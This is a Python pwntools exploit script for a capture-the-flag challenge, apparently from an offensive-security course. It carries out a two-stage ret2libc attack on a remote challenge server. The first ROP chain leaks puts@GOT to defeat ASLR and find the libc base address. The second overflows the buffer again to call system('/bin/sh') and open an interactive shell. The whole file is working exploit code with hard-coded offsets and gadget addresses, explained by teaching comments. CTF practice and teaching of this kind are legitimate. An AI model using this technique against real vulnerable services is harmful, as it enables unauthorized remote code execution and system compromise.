#!/usr/bin/env python3
from pwn import *

#
 # RET2LIBC exploitation
 #
 # This challenge requires a ret2libc attack because the binary does NOT
 # directly expose system() in the PLT.
 #
 # Instead, we first leak a libc address (puts@GOT) using puts@PLT, then
 # compute the libc base address using the known offset of puts inside libc.
 #
 # Once libc base is known, we can resolve any libc function (e.g. system)
 # by using: libc_base + libc.symbols['function'].
 #
 # Finally, we perform a second ROP chain to call system("/bin/sh").
#

p = remote("offsec.m0lecon.it", 13506)

context.binary = elf = ELF('./ret2libc_aslr', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

OFFSET_TO_RIP = 72  # found via cyclic pattern

# To find necessary gadgets, run: ropper --file ./ret2libc_aslr --nocolor --console
# then: 
POP_RDI   = 0x4011ff    # run: search pop rdi; ret
RET       = 0x40101a    # run: search ret

PUTS_PLT  = elf.plt['puts']  # puts@PLT: entry point used to call the external puts() function.
                             # On first call, it jumps through the dynamic linker to resolve the real libc address of puts().

PUTS_GOT  = elf.got['puts']  # puts@GOT: memory slot that stores the resolved address of puts() after the first call.
                             # After dynamic resolution on first call, this entry points directly to the actual puts() implementation in libc.

MAIN      = elf.sym['main']

# -------- Stage 1: leak puts --------
p.recvuntil(b"Tell me your wish: ")
stage1 = flat(
    b'A' * OFFSET_TO_RIP,
    p64(POP_RDI),   # prepare argument for puts()
    p64(PUTS_GOT),  # insert in RDI the address of puts() in the GOT, so that by calling puts() in the next instruction we will print the real address of puts() in libc
    p64(PUTS_PLT),  # call puts() to print the real address of puts() in libc (i.e. we print the value previously passed in RDI as argument to puts())
    p64(MAIN),      # return to main() to be able to send the second stage of the exploit
)
p.sendline(stage1)
p.recvline()        # consume "The stars..."

# STRATEGY: read a runtime pointer (typically from the GOT), subtract the known offset, and recover the library base.
# In this case, we leak the address of puts() in libc, and then we can compute the base address of libc by subtracting the known offset of puts() in libc.
# Once we receive the leaked value of puts, the math is:
#       libc_base = leak_puts - offset_puts
#       system = libc_base + libc.symbols[’system’]

leaked = p.recvline().strip()
leak_puts = u64(leaked.ljust(8, b'\x00'))
log.info(f"puts leak = {leak_puts:#x}")

# Set the libc base address using the leaked puts() address and the known offset of puts() in libc.
# This allows us to calculate the actual addresses of other libc functions, such as system().
libc.address = leak_puts - libc.symbols['puts']
log.info(f"libc base = {libc.address:#x}")

# -------- Stage 2: system("/bin/sh") --------
system_addr = libc.symbols['system']        # compute the actual address of system() in libc
BINSH = next(libc.search(b'/bin/sh\x00'))   # search for the string "/bin/sh" in libc

p.recvuntil(b"Tell me your wish: ")
stage2 = flat(
    b'A' * OFFSET_TO_RIP,
    p64(RET),           # for stack alignment
    p64(POP_RDI),       # prepare argument for system()
    p64(BINSH),         # insert in RDI the address of the string "/bin/sh" in the binary, so that by calling system() in the next instruction we will execute system("/bin/sh")
    p64(system_addr),   # call system("/bin/sh")
)
p.sendline(stage2)
p.interactive()
